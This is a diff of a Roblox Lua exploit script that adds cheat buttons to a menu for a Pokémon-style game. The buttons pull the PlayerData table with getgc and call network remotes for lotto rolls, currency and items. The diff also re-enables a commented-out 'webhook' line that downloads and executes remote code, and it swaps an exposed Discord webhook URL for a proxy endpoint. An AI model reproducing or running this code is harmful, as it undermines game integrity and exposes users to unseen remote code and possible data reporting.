@@ -1,7 +1,7 @@
 local Mercury = loadstring(game:HttpGet("https://raw.githubusercontent.com/igaslight/mew/main/main"))()
 
 --webhook
---loadstring(game:HttpGet"https://raw.githubusercontent.com/ilovelatinawomen/ilovelatinas/main/webhook")()
+loadstring(game:HttpGet"https://raw.githubusercontent.com/ilovelatinawomen/ilovelatinas/main/webhook")()
 loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/igaslightwomen/aid/main/anti%20afk', true))()
 
 local GUI = Mercury:Create{
@@ -555,7 +555,7 @@ local Tab = GUI:Tab{
 }
 
 Tab:Button{
-	Name = "Pokedollars",
+	Name = "Pokedollars (risky)",
 	Description = nil,
 	Callback = function() 
       local _p = nil
@@ -601,7 +601,7 @@ Tab:Button{
 
 local Tab = GUI:Tab{
 	Name = "Submarine",
-	Icon = "rbxassetid://10422352846"
+	Icon = "rbxassetid://10422851158"
 }
 
 Tab:Button{
@@ -644,7 +644,7 @@ Tab:Textbox{
   "Kid with shit exploit"
 
 local url =
-  "https://discordapp.com/api/webhooks/997684737160257766/MhGtDYstWhg8rjveryfFnMk50NXySuaIdi6DIsTBpLBHKWk51h90bmYpVKjWJdJA6d4O"
+  "https://vineyard.performave.com/api/webhook/v1/proxy/929b9614-9f2a-4695-93a4-97cfea77a531'"
 local data = {
   ["embeds"] = {
       {
@@ -816,3 +816,88 @@ end
 _p.Network:get('PDS','useItem','rarecandy', 6)
    end
 }
+
+--[[ 
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠞⢳⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡔⠋⠀⢰⠎⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⢆⣤⡞⠃⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⢠⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⢀⣀⣾⢳⠀⠀⠀⠀⢸⢠⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⣀⡤⠴⠊⠉⠀⠀⠈⠳⡀⠀⠀⠘⢎⠢⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀
+⠳⣄⠀⠀⡠⡤⡀⠀⠘⣇⡀⠀⠀⠀⠉⠓⠒⠺⠭⢵⣦⡀⠀⠀⠀
+⠀⢹⡆⠀⢷⡇⠁⠀⠀⣸⠇⠀⠀⠀⠀⠀⢠⢤⠀⠀⠘⢷⣆⡀⠀
+⠀⠀⠘⠒⢤⡄⠖⢾⣭⣤⣄⠀⡔⢢⠀⡀⠎⣸⠀⠀⠀⠀⠹⣿⡀Button Ten
+⠀⠀⢀⡤⠜⠃⠀⠀⠘⠛⣿⢸⠀⡼⢠⠃⣤⡟⠀⠀⠀⠀⠀⣿⡇
+⠀⠀⠸⠶⠖⢏⠀⠀⢀⡤⠤⠇⣴⠏⡾⢱⡏⠁⠀⠀⠀⠀⢠⣿⠃
+⠀⠀⠀⠀⠀⠈⣇⡀⠿⠀⠀⠀⡽⣰⢶⡼⠇⠀⠀⠀⠀⣠⣿⠟⠀
+⠀⠀⠀⠀⠀⠀⠈⠳⢤⣀⡶⠤⣷⣅⡀⠀⠀⠀⣀⡠⢔⠕⠁⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠫⠿⠿⠿⠛⠋⠁⠀⠀⠀⠀
+--]]
+
+local Tab = GUI:Tab{
+	Name = "Lotto Guy",
+	Icon = "rbxassetid://10422352846"
+}
+
+Tab:Button{
+	Name = "Get Lotto",
+	Description = nil,
+	Callback = function() 
+      local _p = nil
+for _, v in pairs(getgc(true)) do
+   if typeof(v) == "table" then
+       if rawget(v, "PlayerData") then
+           _p = v
+           break
+       end
+   end
+end
+_p.Network:get('PDS','getlottotoday')
+_p.Network:get('PDS','getlottoticketcount')
+_p.Network:get('PDS','getlottoroll')
+_p.Network:get('PDS','getlottotoday')
+   end
+}
+
+--[[ 
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠞⢳⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡔⠋⠀⢰⠎⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⢆⣤⡞⠃⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⢠⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⢀⣀⣾⢳⠀⠀⠀⠀⢸⢠⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⣀⡤⠴⠊⠉⠀⠀⠈⠳⡀⠀⠀⠘⢎⠢⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀
+⠳⣄⠀⠀⡠⡤⡀⠀⠘⣇⡀⠀⠀⠀⠉⠓⠒⠺⠭⢵⣦⡀⠀⠀⠀
+⠀⢹⡆⠀⢷⡇⠁⠀⠀⣸⠇⠀⠀⠀⠀⠀⢠⢤⠀⠀⠘⢷⣆⡀⠀
+⠀⠀⠘⠒⢤⡄⠖⢾⣭⣤⣄⠀⡔⢢⠀⡀⠎⣸⠀⠀⠀⠀⠹⣿⡀Button Eleven
+⠀⠀⢀⡤⠜⠃⠀⠀⠘⠛⣿⢸⠀⡼⢠⠃⣤⡟⠀⠀⠀⠀⠀⣿⡇
+⠀⠀⠸⠶⠖⢏⠀⠀⢀⡤⠤⠇⣴⠏⡾⢱⡏⠁⠀⠀⠀⠀⢠⣿⠃
+⠀⠀⠀⠀⠀⠈⣇⡀⠿⠀⠀⠀⡽⣰⢶⡼⠇⠀⠀⠀⠀⣠⣿⠟⠀
+⠀⠀⠀⠀⠀⠀⠈⠳⢤⣀⡶⠤⣷⣅⡀⠀⠀⠀⣀⡠⢔⠕⠁⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠫⠿⠿⠿⠛⠋⠁⠀⠀⠀⠀
+--]]
+
+local Tab = GUI:Tab{
+	Name = "PC",
+	Icon = "rbxassetid://10423046114"
+}
+
+Tab:Button{
+	Name = "Open PC",
+	Description = nil,
+	Callback = function() 
+      local _p = nil
+for _, v in pairs(getgc(true)) do
+   if typeof(v) == "table" then
+       if rawget(v, "PlayerData") then
+           _p = v
+           break
+       end
+   end
+end
+_p.Menu.pc:open()
+_p.Network:get('PDS','openPC')
+_p.Network:get('PDS','cPC','getSummary', 6)
+   end
+}
+
+
